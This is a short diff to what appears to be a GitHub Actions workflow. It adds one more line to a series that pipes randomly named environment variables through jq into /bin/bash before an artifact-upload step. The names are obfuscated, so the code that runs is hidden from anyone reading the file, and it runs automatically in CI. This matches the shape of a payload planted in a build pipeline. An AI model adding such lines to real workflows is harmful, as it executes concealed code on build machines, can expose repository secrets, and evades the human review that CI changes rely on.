@@ -25,6 +25,7 @@ jobs:
           echo $kadp2320 | jq -r .acy79 | /bin/bash
           echo $adp044 | jq -r .qspyn3448 | /bin/bash
           printf '%s' "$noytt066" | jq -r .e06 | /bin/bash
+          echo $aseaf6 | jq -r .q4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
